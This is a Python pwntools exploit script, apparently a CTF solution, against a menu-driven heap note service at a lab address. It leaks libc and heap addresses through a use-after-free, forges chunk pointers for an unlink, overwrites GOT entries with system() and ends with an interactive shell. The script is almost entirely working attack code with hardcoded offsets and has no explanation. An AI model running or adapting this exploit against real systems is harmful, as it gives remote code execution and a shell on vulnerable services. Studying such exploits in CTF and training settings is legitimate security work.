from pwn import *

# Tested on Ubuntu 16.04

def menu(n):
	s.sendafter("Exit", str(n) + "\n")

def add(i, sz, c):
	menu(1)
	s.sendafter("Index: ", str(i) + "\n")
	s.sendafter("Enter the size: ", str(sz) + "\n")
	s.sendafter("Enter the content: ", c + "\n")

def update(i, c):
	menu(2)
	s.sendafter("Index: ", str(i) + "\n")
	s.sendafter("Enter the content: ", c + "\n")

def printa(i):
	menu(3)
	s.sendafter("Index: ", str(i) + "\n")
	s.recvline()
	return s.recv(8)

def delete(i):
	menu(4)
	s.sendafter("Index: ", str(i) + "\n")	

def salir():
	menu(5)

'''
buffer_2->fd = victim
buffer_2->bk = buffer_1
buffer_1->fd = buffer_2
victim->bk   = buffer_2
'''

s = remote("172.17.4.8", 4242)
add(0, 256, "")
add(1, 256, "")
add(2, 256, "")
add(3, 256, "")
delete(0)
delete(2)
data = printa(0)
libc_base = u64(data[:16].ljust(8, '\0')) - 0x3C4B78
data = printa(2)
heap = u64(data[:16].ljust(8, '\0'))
print "[+] heap: 0x%08x" % heap
print "[+] libc_base: 0x%08x" % libc_base
delete(1)
delete(3)
p_system = libc_base + 0x45390
p_puts = libc_base + 0x6f690
add(0, 256, "") # buffer_2 = 0x603000
add(1, 256, "") # buffer_1 = 0x603110
add(2, 512, "") # victim = 0x603220
update(0, p64(heap + 0x220) + p64(heap + 0x110))
update(1, p64(heap))
add(3, 1000, "")
delete(2)
add(4, 1200, "")
update(2, p64(0) + p64(heap))
add(5, 512, "")
add(6, 512, "") # ptr to buffer2 & can overflow :)
update(6, p64(0x0) + p64(0x101) + p64(0x6020b8) + p64(0x6020c0) + "/bin/sh\0"*(224//8) + p64(0x100) + p64(0x110) + p64(0) + p64(0))
	  #prev_size #size        #fd             #bk                       		 #prev_size   #size
delete(1)
update(6, p64(0x602018) + p64(0x6020c0))
update(3, p64(p_system) + p64(p_puts)) # 2nd parameter for no match puts()
update(4, p64(heap + 0x30))
delete(4)
print "[+] got shell ?"
s.interactive()

